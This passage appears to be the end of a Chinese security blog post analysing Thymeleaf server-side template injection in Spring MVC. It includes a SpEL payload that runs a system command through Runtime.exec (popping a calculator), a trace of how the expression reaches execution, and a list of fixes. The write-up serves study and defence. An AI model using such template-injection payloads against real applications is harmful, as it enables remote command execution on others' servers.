+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>).getInputStream()).next()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="IWGmVxzna6lKOKC953_kqmMj2BPxXnODz7vKo4WCwr0.png" alt="image"></p>
+<p>然后调用expression.execute（42）</p>
+<p><img src="XCNeHvySqccF4wE9w2m6Zft4aD4TJsVUxiVTxBn2euQ.png" alt="image"></p>
+<p>我们跟进来发现又调用了另一个execute，把this（payload）传进去。</p>
+<p><img src="Yi0NliqI420ww5cXZB7tt63D55M2496Ap2ewqBAMvOM.png" alt="image"></p>
+<p>我们跟进去，一进来就发现第一个if对expression 对象进行类型检测，判断表达式类型是否为 SimpleExpression。这里确实是SimpleExpression，所以调用SimpleExpression.executeSimple进行了执行。</p>
+<p><img src="eqE5ZF37w9-TAeou6RLtr7CysxxDD7qMqaAgM23wT2g.png" alt="image"></p>
+<p>SimpleExpression.executeSimple执行spel表达，成功弹计算器。</p>
+<p><img src="FrYU4DJ8NxtpUSPbr2Jti7AuRb8UVhnrVEGasNqltLc.png" alt="image"></p>
+<p><img src="kzystS4Asr-inkRBPQ1i6uhzgS3WHLQMpryrtVhag3M.png" alt="image"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>这个漏洞的复现，很多工作都是在跟进SpringMvc的一个工作流程。需要对SpringMvc的工作流程了解，和SpringMvc的九大初始化组件了解，才得以进一步追踪污染传播的方法以及整个流程。</li>
+<li>在通过render 渲染进行视图渲染的时候，会先检测是否包含“::”，然后进入分支添加上~{}进行解析。解析前进行预处理，即通过正则取出两个横线之间的内容，然后调用标准解析器对其进行解析，匹配到了spel表达式，从而导致了spel表达式命令执行。</li>
+</ul>
+<p><img src="o27q8Sx0mxQMudsxOj5utgUcxpEht3cqcsFU6R3mogU.png" alt="image"></p>
+<h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><ul>
+<li>升级版本</li>
+<li>配置 <code>@ResponseBody</code> 或者 <code>@RestController</code></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这样 spring 框架就不会将其解析为视图名，而是直接返回, 不再调用模板解析。</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在返回值前面加上 “redirect:”</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这样不再由 Spring ThymeleafView来进行解析，而是由 RedirectView 来进行解析。</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在方法参数中加上 HttpServletResponse 参数</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析。</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263451/article/details/126543803">https://blog.csdn.net/weixin_43263451&#x2F;article&#x2F;details&#x2F;126543803</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/u2ooYhAZ0Elbe02PDNQBWw">https://mp.weixin.qq.com/s/u2ooYhAZ0Elbe02PDNQBWw</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/2YpBKOzJ8w8m51OUN1XJ0A">https://mp.weixin.qq.com/s/2YpBKOzJ8w8m51OUN1XJ0A</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Thymeleaf的SSTI复现与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#doDispatch"><span class="toc-number">1.4.1.</span> <span class="toc-text">doDispatch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%89%8D%E7%AB%AF%E6%8E%A7%E5%88%B6%E5%99%A8%E6%8B%A6%E6%88%AA%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%B7%E6%B1%82"><span class="toc-number">1.4.2.</span> <span class="toc-text">1.前端控制器拦截用户的请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%84%E7%90%86%E5%99%A8%E6%98%A0%E5%B0%84%E5%99%A8%E6%89%A7%E8%A1%8C%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%B7%E6%B1%82"><span class="toc-number">1.4.3.</span> <span class="toc-text">2.处理器映射器执行用户的请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%A4%84%E7%90%86%E5%99%A8%E9%80%82%E9%85%8D%E5%99%A8HandlerAdpater"><span class="toc-number">1.4.4.</span> <span class="toc-text">3.获取处理器适配器HandlerAdpater</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A4%84%E7%90%86%E5%99%A8%E9%80%82%E9%85%8D%E5%99%A8%E5%AF%B9Handler%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86"><span class="toc-number">1.4.5.</span> <span class="toc-text">4.处理器适配器对Handler进行处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%A4%84%E7%90%86%E6%B4%BE%E5%8F%91%E7%BB%93%E6%9E%9C"><span class="toc-number">1.4.6.</span> <span class="toc-text">5.处理派发结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">1.6.</span> <span class="toc-text">修复方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/05/23/Thymeleaf%E7%9A%84SSTI%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
